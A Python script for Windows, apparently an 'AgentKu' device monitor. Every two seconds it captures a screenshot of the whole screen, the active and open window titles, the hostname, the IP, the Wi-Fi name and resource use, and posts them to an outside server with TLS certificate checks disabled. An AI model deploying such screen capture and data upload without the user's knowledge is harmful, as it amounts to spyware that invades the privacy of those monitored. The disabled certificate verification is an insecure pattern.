import time
# Trigger build
import json
import urllib.request
import os, base64
import ctypes
import sys
import psutil
import socket
import subprocess
from PIL import ImageGrab
from io import BytesIO

# Prevent multiple instances
mutex = ctypes.windll.kernel32.CreateMutexW(None, False, "Global\\AgentKu_Monitor_Mutex_v1")
if ctypes.windll.kernel32.GetLastError() == 183: # ERROR_ALREADY_EXISTS
    sys.exit(0)

def get_active_window():
    try:
        hwnd = ctypes.windll.user32.GetForegroundWindow()
        length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
        buff = ctypes.create_unicode_buffer(length + 1)
        ctypes.windll.user32.GetWindowTextW(hwnd, buff, length + 1)
        return buff.value
    except Exception:
        return "Unknown"

def get_open_apps():
    titles = []
    def foreach_window(hwnd, lParam):
        if ctypes.windll.user32.IsWindowVisible(hwnd):
            length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
            if length > 0:
                buff = ctypes.create_unicode_buffer(length + 1)
                ctypes.windll.user32.GetWindowTextW(hwnd, buff, length + 1)
                title = buff.value
                if title not in titles and title != "Program Manager" and title != "Settings":
                    titles.append(title)
        return True
    EnumWindowsProc = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.POINTER(ctypes.c_int), ctypes.POINTER(ctypes.c_int))
    ctypes.windll.user32.EnumWindows(EnumWindowsProc(foreach_window), 0)
    return titles[:10]

net_cache = {"ip": "127.0.0.1", "ssid": "Unknown", "last_update": 0}
def get_network_info():
    if time.time() - net_cache["last_update"] < 60:
        return net_cache["ip"], net_cache["ssid"]

    ip = "127.0.0.1"
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
    except Exception:
        pass

    ssid = "Unknown"
    try:
        ps_out = subprocess.check_output(
            'powershell -NoProfile -Command "(Get-NetConnectionProfile).Name"',
            shell=True, text=True, creationflags=0x08000000,
            stdin=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        ).strip()
        if ps_out:
            ssid = ps_out.splitlines()[0]
    except Exception:
        pass

    net_cache["ip"] = ip
    net_cache["ssid"] = ssid
    net_cache["last_update"] = time.time()
    return ip, ssid

def main():
    print("AgentKu Windows started...")
    url = "https://agentku.mybbs.id/api/monitor"

    try:
        ctypes.windll.shcore.SetProcessDpiAwareness(2)
    except:
        try:
            ctypes.windll.user32.SetProcessDPIAware()
        except:
            pass

    psutil.cpu_percent(interval=None) # init

    while True:
        window = get_active_window()
        apps = get_open_apps()
        ip, ssid = get_network_info()

        cpu = psutil.cpu_percent(interval=None)
        ram = psutil.virtual_memory().percent
        try:
            storage = psutil.disk_usage('C:\\').percent
        except:
            storage = 0

        screen_b64 = ""
        try:
            img = ImageGrab.grab()
            img = img.convert('RGB')
            img.thumbnail((1280, 720)) # Resize to max 1280x720 to keep size small
            buffered = BytesIO()
            img.save(buffered, format="JPEG", quality=60) # Lower quality to save bandwidth
            screen_b64 = "data:image/jpeg;base64," + base64.b64encode(buffered.getvalue()).decode('utf-8')
        except Exception as e:
            pass

        data = {
            "status": "active",
            "window": window,
            "user": socket.gethostname(),
            "device": "Windows",
            "screen": screen_b64,
            "cpu": cpu,
            "ram": ram,
            "storage": storage,
            "ip": ip,
            "ssid": ssid,
            "apps": apps
        }

        req = urllib.request.Request(
            url,
            data=json.dumps(data).encode('utf-8'),
            headers={'Content-Type': 'application/json', 'Accept': 'application/json'},
            method='POST'
        )

        try:
            import ssl
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with urllib.request.urlopen(req, context=ctx) as response:
                print(f"Sent: {window} -> {response.status}")
        except Exception as e:
            print(f"Error sending data: {e}")

        time.sleep(2)

if __name__ == "__main__":
    main()
